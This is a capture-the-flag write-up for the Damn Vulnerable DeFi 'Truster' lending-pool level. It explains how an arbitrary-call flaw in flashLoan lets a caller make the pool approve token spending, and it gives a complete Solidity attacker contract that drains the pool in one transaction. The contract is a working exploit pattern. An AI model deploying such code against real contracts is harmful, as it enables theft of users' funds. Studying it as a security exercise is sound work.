# Intro

More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

Currently the pool has 1 million DVT tokens in balance. And you have nothing.

But don't worry, you might be able to take them all from the pool. In a single transaction.

# Attack explanation

Our objective is to take all DVT tokens from the lending pool in a single transaction. If we dig the contract, we can find the next function that is providing the loans:

```
function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
```

As we see, the parameters provided are borrow amount, address of the borrower, target contract to execute code and the data that is going to be executed. With the target.functionCall(data) we could approve our attacking sc to spend all of the pool tokens from the token contract.

So, in order to beat the level, we need to execute flashLoan, make the pool approve our attacker sc as spender at the token contract, repay the loan and take all the tokens after that to our attacker address.

# Attack function

We can create the following attacker contract to make the attack in a single transaction:

```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title AttackerContractTruster
 * @author Juan Farber (github.com/Farber98)
 */
contract AttackerContractTruster {
    constructor(
        IERC20 _tokenAddress,
        address _trusterLenderPool,
        address _attacker,
        uint256 balance
    ) {
        // Prepare data that we are going to execute on flashLoan call. This is the approval.
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            balance
        );

        // Call the flashLoan so the so the pool approves this sc inside the token contract.
        _trusterLenderPool.call(
            abi.encodeWithSignature(
                "flashLoan(uint256,address,address,bytes)",
                0, // Borrow 0 so we don't need to repay.
                address(this),
                _tokenAddress,
                data
            )
        );

        // Take the funds and transfer to attacker address.
        _tokenAddress.transferFrom(_trusterLenderPool, _attacker, balance);
    }
}

```
